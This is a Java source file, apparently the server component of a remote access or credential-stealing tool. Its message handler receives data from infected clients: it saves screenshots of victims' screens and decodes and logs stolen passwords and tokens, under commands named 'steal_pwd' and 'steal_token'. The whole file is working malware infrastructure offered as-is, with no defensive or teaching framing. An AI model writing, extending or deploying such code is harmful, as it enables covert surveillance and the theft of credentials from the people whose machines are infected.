package me.soda.server.handlers;

import java.io.File;
import java.io.FileOutputStream;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.Base64;

import static me.soda.server.Server.log;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    private static String[] doStringParse(String[] msgArr) throws IllegalArgumentException {
        if (msgArr.length < 2) throw new IllegalArgumentException();
        String[] msgArr_ = decodeBase64(msgArr[1]).split(" ");
        String[] strArr = new String[msgArr_.length - 1];
        for (int index = 0; index < strArr.length; index++) {
            strArr[index] = decodeBase64(msgArr_[index + 1]);
        }
        return strArr;
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void handle(String[] msgArr) {
        switch (msgArr[0]) {
            case "screenshot":
                try {
                    File filename = new File("screenshots",
                            LocalTime.now().format(DateTimeFormatter.ofPattern("hh-mm-ss")) + ".png");
                    new File("screenshots").mkdir();
                    filename.createNewFile();
                    FileOutputStream file = new FileOutputStream(filename);
                    file.write(Base64.getDecoder().decode(msgArr[1]));
                    file.close();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            case "steal_pwd":
            case "steal_token":
                try {
                    log("Message: " + msgArr[0] + " " + Arrays.toString(doStringParse(msgArr)));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            default:
                try {
                    log("Message: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
        }
    }
}
